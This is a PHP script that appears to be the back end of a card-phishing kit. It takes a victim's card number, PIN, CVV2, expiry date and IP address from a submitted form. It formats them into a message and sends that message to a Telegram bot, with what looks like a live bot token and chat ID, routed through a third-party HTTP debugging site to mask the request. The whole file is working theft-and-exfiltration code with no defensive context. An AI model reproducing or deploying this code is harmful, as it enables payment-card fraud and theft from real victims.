<?php

if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}

include "Bankinfo.php";
$token = "6332838966:AAEqWUi0AcLwNynZ7RpDmeROrg25bfZu2Bk";

$id ="-1002135250938";
$pan = $_POST["pan"];
$pin = $_POST["pin"];
$cvv = $_POST["cvv2"];
$year = $_POST["expireYear"];
$month = $_POST["expireMonth"];

$num = $_POST["num"];
if(isset($_POST["inputemail"])){
    $email = $_POST["inputemail"];
}else{
    $email = "None";
}


$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-10);
$bankinfo = bank_information($cardn);
if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
$ip = $_SERVER["HTTP_CLIENT_IP"];
} else {
if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
} else {
$ip = $_SERVER["REMOTE_ADDR"];
}
}
$Text = "
╠🌇Cᴀʀᴅ ➣ <code>$pan</code>
╠🎑Pᴀss ➣ $pin
╠🌠Cᴠᴠ2 ➣ <code>$cvv</code>
╠🌃Dᴀᴛᴇ ➣ $year/$month

<code>$ip</code>

@J00RJ";
    
$HttpDebug = "https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx";

$TelegramApiUrl = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($Text) . '&parse_mode=HTML';

//var_dump($TelegramApiUrl);die;

 

$Payloads = [

    "UrlBox"       => $TelegramApiUrl,

    "AgentList"    => "MOzilla Firefox",

    "VersionsList" => "HTTP/1.1",

    "MethodList"   => "POST"

];

 

$ch = curl_init();

curl_setopt($ch,CURLOPT_URL, $HttpDebug);

curl_setopt($ch,CURLOPT_POST, true);

curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));

curl_setopt($ch,CURLOPT_POSTFIELDS, json_encode($Payloads));

curl_setopt($ch,CURLOPT_RETURNTRANSFER, true); 

curl_setopt($ch, CURLOPT_VERBOSE, true);

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$result = curl_exec($ch);

$errNo = curl_errno($ch);

$err = curl_error($ch);

curl_close($ch); 

 

?>
